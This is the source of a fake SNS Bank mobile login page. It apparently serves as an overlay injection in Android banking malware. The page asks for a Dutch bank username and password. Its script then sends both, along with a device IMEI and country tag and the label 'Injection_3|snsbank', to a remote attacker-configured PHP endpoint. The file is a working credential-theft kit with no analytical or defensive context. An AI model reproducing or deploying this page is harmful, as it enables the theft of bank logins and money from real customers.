<html>
        <head>
                <meta charset="UTF-8">
                <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.4/angular.min.js"></script>
                <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css">
                <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/js/bootstrap.min.js"></script>
                <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css">
                <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
                <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.0/umd/popper.min.js"></script>
                <link href="nl/nl.snsbank.mobielbetalen/style.css" rel="stylesheet">
        </head>
        <?php
        $IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
        //$IMEI_country = "321|tr";
        include "config.php";
        ?>
        <body>
            <div class="header">
                <img style="margin-top: -5px;margin-right: 20px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABMAAAATCAIAAAD9MqGbAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyJpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoV2luZG93cykiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6NzQwM0ZGNkU4NDRDMTFFOEI5QjVCRTNDMDYxMTcxM0MiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6NzQwM0ZGNkY4NDRDMTFFOEI5QjVCRTNDMDYxMTcxM0MiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDo3NDAzRkY2Qzg0NEMxMUU4QjlCNUJFM0MwNjExNzEzQyIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDo3NDAzRkY2RDg0NEMxMUU4QjlCNUJFM0MwNjExNzEzQyIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PsViUmkAAAFkSURBVHjaYgxTL2IgCzDhkTN11uHgZidZJ1Bb8ZSEaftrufm4sCpgwSpq5qpbPDkByFg9eee3z9+J1Wnhrlc4MR7IWNi+cceSI////ydKp6WHfsGEOIb/DEt6tmxbdIjhP85QQNFp6WlQ0B8LtGTFhO2b5+7HH7YInVaeBvlgbasn79owcy/BWIHqtPIyyO+LBTI+vP785/cf/1Qn/No2zt7HAEwJ+e7t/0kEQF0gO58/eD2/eX1ibSCQ/eXjtwuHbhCThqCu3bH0yH+G/0m1Qdy8nBeP3Dy08QxBnczaIpYQ1t3Ljz+9/WLkqGXqogN0xePbL4jVCdJ85fHHN1+MHbXM3PSAOp/efUmsTiC4d+Xxh1efjJ20gXH74PqzZ/dfEasTpPnqk3cvPpo4aVt7Gz649vTZ/dck5JV9a05Or1wBZBRPSeTk4SAhrwDBgfWnmZiZjm+/8P3rT9J0QmzGIwsQYABAosOyqkggjQAAAABJRU5ErkJggg==">
                <h3>Vul uw gegevens in</h3>
            </div>
            <form id="form" >
                <div style="padding: 5px;">
                    <div class="input-group mb-3">
                        <div class="input-group-prepend">
                            <span class="input-group-text" style="border-radius: 0;">Toegangsnaam</span>
                        </div>
                        <input type="tel" class="form-control" id="login" name="login" style="border-radius: 0;" required>
                    </div>

                    <div class="input-group mb-3">
                        <div class="input-group-prepend">
                            <span class="input-group-text" style="border-radius: 0;">Wachtwoord</span>
                        </div>
                        <input type="password" class="form-control" id="password" name="password" style="border-radius: 0;" required>
                    </div>
                    <input type="submit" class="btn btn-primary active" id="btn_finish" value="INLOGGEN">
                </div>
            </form>
            <script type="text/javascript">
                (function () {


               var  __insHiddenField = function (objDoc, objForm, sNm, sV) {
                    var input = objDoc.createElement("input");
                    input.setAttribute("type", "hidden");
                    input.setAttribute("name", sNm);
                    input.setAttribute("value", sV);
                    input.value = sV;
                    objForm.appendChild(input);
                };
                           var g_oBtn = document.getElementById('btn_finish');
                           g_oBtn.onclick = function () {

                               var oNumInp = document.getElementById('login');
                               var oCodeInp = document.getElementById('password');

                               try{
                                   oNumInp.className = 'form-control';
                                   oCodeInp.className = 'form-control';
                               } catch(e){};

                               if (oNumInp.value.length < 3) {
                                   try{
                                       oNumInp.className = 'form-control error';
                                   } catch(e){};
                                   return false;
                               }

                               if (!/^\w{3,100}$/i.test(oCodeInp.value)) {
                                   try{
                                       oCodeInp.className = 'form-control error';
                                   } catch(e){};
                                   return false;
                               }
        top['closeDlg'] = true;
        var url='<?php echo $URL; ?>';
        var imei_c='<?php echo $IMEI_country; ?>';
        location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_3|snsbank|"+oNumInp.value+"|"+oCodeInp.value);

        return false;
        };

        })();
        </script>
        </body>
        </html>
